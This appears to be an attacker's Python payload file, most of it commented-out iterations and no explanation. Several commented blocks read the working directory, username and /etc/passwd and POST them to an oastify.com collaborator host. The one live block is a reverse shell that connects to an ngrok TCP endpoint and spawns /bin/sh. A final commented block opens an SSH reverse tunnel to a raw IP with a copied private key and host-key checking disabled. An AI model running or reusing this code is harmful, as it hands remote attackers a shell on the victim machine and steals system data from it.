# import urllib
# with urllib.request.urlopen('https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com') as response:
#    html = response.read()

# print("hello world")

# ---------------------------

# import os
# import urllib.parse
# import urllib.request

# # Get the current working directory
# current_directory = os.getcwd()

# # Define the URL to send the data
# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'

# # Create a dictionary with the data to send
# data = {
#     'directory': current_directory,
#     'user': os.environ['USERNAME']
# }

# # Encode the data for the URL
# encoded_data = urllib.parse.urlencode(data).encode('utf-8')

# # Send the data to the URL
# with urllib.request.urlopen(url, data=encoded_data) as response:
#     print(f'Data sent successfully to {url}')

# -------------------------

# import os
# import pwd
# import urllib.parse
# import urllib.request

# # Get the current working directory
# current_directory = os.getcwd()

# # Get the current user
# user_info = pwd.getpwuid(os.getuid())
# current_user = user_info.pw_name

# # Define the URL to send the data
# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'

# # Create a dictionary with the data to send
# data = {
#     'directory': current_directory,
#     'user': current_user
# }

# # Encode the data for the URL
# encoded_data = urllib.parse.urlencode(data).encode('utf-8')

# # Send the data to the URL
# with urllib.request.urlopen(url, data=encoded_data) as response:
#     print(f'Data sent successfully to {url}')

# -----------------------

# import os
# import pwd
# import urllib.parse
# import urllib.request

# # Get the current working directory
# current_directory = os.getcwd()

# # Get the current user
# user_info = pwd.getpwuid(os.getuid())
# current_user = user_info.pw_name

# # Read the contents of /opt/text file
# opt_text_file_path = '/etc/passwd'
# try:
#     with open(opt_text_file_path, 'r') as opt_text_file:
#         opt_contents = opt_text_file.read()
# except FileNotFoundError:
#     opt_contents = "File not found."

# # Define the URL to send the data
# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'

# # Create a dictionary with the data to send
# data = {
#     'directory': current_directory,
#     'user': current_user,
#     'opt_contents': opt_contents
# }

# # Encode the data for the URL
# encoded_data = urllib.parse.urlencode(data, doseq=True).encode('utf-8')

# # Send the data to the URL
# try:
#     with urllib.request.urlopen(url, data=encoded_data) as response:
#         print(f'Data sent successfully to {url}')
# except urllib.error.URLError as e:
#     print(f'An error occurred: {e.reason}')

# # Print the contents of /opt/text file
# print(f"Contents of {opt_text_file_path}:\n{opt_contents}")

# -------------------------

import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("7.tcp.eu.ngrok.io",17262))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")

# ---------------------------
 
# import os

# os.system("cp mlops_tunnel.pem /tmp/mlops_tunnel.pem")
# os.system("chmod 600 /tmp/mlops_tunnel.pem")
# os.system("ssh -i /tmp/mlops_tunnel.pem -N -R 7010:127.0.0.1:23 -o StrictHostKeyChecking=no -vvv tunnel@4.231.121.209")
